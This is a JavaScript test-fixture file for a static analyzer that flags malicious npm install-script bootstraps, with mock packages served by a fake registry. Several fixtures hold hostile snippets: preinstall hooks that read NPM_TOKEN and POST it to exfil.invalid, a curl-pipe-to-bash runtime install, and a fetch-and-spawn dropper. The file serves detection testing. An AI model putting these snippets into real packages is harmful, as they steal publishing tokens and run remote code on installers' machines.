'use strict';
// Runtime-bootstrap fixtures. The lockfiles on disk carry only package names
// and versions (no install scripts, nothing an antivirus heuristic keys on);
// the payloads below are served as in-memory tarballs by a mock registry in
// test/bootstrap.test.js and by scripts/serve-bootstrap-fixtures.js. That keeps
// the ChainDrop-shaped bytes out of node_modules on disk, where Windows
// Defender quarantines them mid-run (see the repo's build notes).
//
// Every host here is a reserved-invalid TLD, and no archive is ever fetched:
// the strings exist so the static analyzer has something real to resolve.
const fs = require('node:fs');
const path = require('node:path');

// The signed bun release the ChainDrop dropper pulled (stepsecurity.io), a real
// oven-sh/bun release URL matched by the RUNTIME_DIST table.
const BUN_RELEASE = 'https://github.com/oven-sh/bun/releases/download/bun-v1.3.13/bun-linux-x64-baseline.zip';

// The bundled second stage: reads the npm token, beacons it out. Its net + env
// capabilities must surface merged into the bootstrap finding.
const STAGE2 = [
  "'use strict';",
  'const token = process.env.NPM_TOKEN;',
  "fetch('https://exfil.invalid/collect', { method: 'POST', body: token });",
  '',
].join('\n');

const SETUP_MJS = [
  "'use strict';",
  "const { spawnSync } = require('node:child_process');",
  "const os = require('node:os');",
  "const path = require('node:path');",
  `const url = '${BUN_RELEASE}';`,
  'async function main() {',
  '  await fetch(url);',
  '  const bin = path.join(os.tmpdir(), `bun-dl-${process.pid}`, \'bun\');',
  "  spawnSync(bin, ['./stage2.js'], { stdio: 'inherit' });",
  '}',
  'main();',
  '',
].join('\n');

const SETUP_TS = [
  '// deno entry point (TypeScript): read a secret, beacon it out.',
  'const token: string | undefined = Deno.env.get("NPM_TOKEN");',
  'await fetch("https://exfil.invalid/collect", { method: "POST", body: token });',
  'export {};',
  '',
].join('\n');

const CYCLE_A = "const { spawn } = require('node:child_process');\nspawn('bun', ['./b.js']);\n";
const CYCLE_B = "const { spawn } = require('node:child_process');\nspawn('node', ['./a.js']);\nfetch('https://beacon.invalid/ping');\n";

// dir: the fixture folder (also the lockfile's project name)
// versions: name -> { version, scripts, files } served by the mock registry
// lock: which name@version the fixture's package-lock.json pins
const SHAPES = [
  {
    dir: 'chaindrop-shape', name: 'chaindrop-demo', lock: '2.0.1',
    versions: {
      '2.0.1': { scripts: { preinstall: 'node setup.mjs' }, files: { 'setup.mjs': SETUP_MJS, 'stage2.js': STAGE2 } },
    },
  },
  {
    dir: 'bun-bootstrap', name: 'bun-curl-demo', lock: '1.4.2',
    versions: {
      '1.4.2': {
        scripts: { preinstall: 'curl -fsSL https://bun.sh/install | bash && ~/.bun/bin/bun ./scripts/setup.js' },
        files: { 'scripts/setup.js': STAGE2 },
      },
    },
  },
  {
    dir: 'deno-bootstrap', name: 'deno-run-demo', lock: '0.3.0',
    versions: {
      '0.3.0': { scripts: { preinstall: 'deno run -A ./setup.ts' }, files: { 'setup.ts': SETUP_TS } },
    },
  },
  {
    dir: 'benign-bun', name: 'benign-bun-demo', lock: '3.1.0',
    versions: {
      '3.1.0': { scripts: { postinstall: 'bun run build', build: 'bun ./scripts/build.js' }, files: { 'scripts/build.js': "console.log('building');\n" } },
    },
  },
  {
    dir: 'unresolved-bun', name: 'unresolved-bun-demo', lock: '1.0.0',
    versions: {
      '1.0.0': { scripts: { preinstall: 'bun ./setup.js' }, files: {} },
    },
  },
  {
    dir: 'cross-runtime-cycle', name: 'cycle-demo', lock: '1.0.0',
    versions: {
      '1.0.0': { scripts: { preinstall: 'node a.js' }, files: { 'a.js': CYCLE_A, 'b.js': CYCLE_B } },
    },
  },
  {
    // patch-bump pair: 1.0.0 is benign, 1.0.1 gains the bootstrap, the exact
    // fingerprint of a hijacked republish. The fixture pins 1.0.1; the diff
    // base pins 1.0.0.
    dir: 'patched-release', name: 'patched-demo', lock: '1.0.1', diffBase: '1.0.0',
    versions: {
      '1.0.0': { scripts: { postinstall: 'bun run build', build: 'bun ./scripts/build.js' }, files: { 'scripts/build.js': "console.log('ok');\n" } },
      '1.0.1': { scripts: { preinstall: 'node setup.mjs' }, files: { 'setup.mjs': SETUP_MJS, 'stage2.js': STAGE2 } },
    },
  },
];

const lockfile = (name, pkg, version) => ({
  name, version: '1.0.0', lockfileVersion: 3, requires: true,
  packages: {
    '': { name, version: '1.0.0', dependencies: { [pkg]: `^${version}` } },
    [`node_modules/${pkg}`]: { version, hasInstallScript: true },
  },
});

// Write only the bare lockfiles to disk (safe: names + versions, no scripts).
function writeLockfiles() {
  for (const s of SHAPES) {
    const dir = path.join(__dirname, s.dir);
    fs.mkdirSync(dir, { recursive: true });
    fs.writeFileSync(path.join(dir, 'package-lock.json'), `${JSON.stringify(lockfile(s.dir, s.name, s.lock), null, 2)}\n`);
    if (s.diffBase) {
      fs.writeFileSync(path.join(dir, 'base-lock.json'), `${JSON.stringify(lockfile(s.dir, s.name, s.diffBase), null, 2)}\n`);
    }
  }
}

module.exports = { SHAPES, writeLockfiles };

if (require.main === module) {
  writeLockfiles();
  process.stdout.write(`wrote ${SHAPES.length} bootstrap lockfiles under ${__dirname}\n`);
}
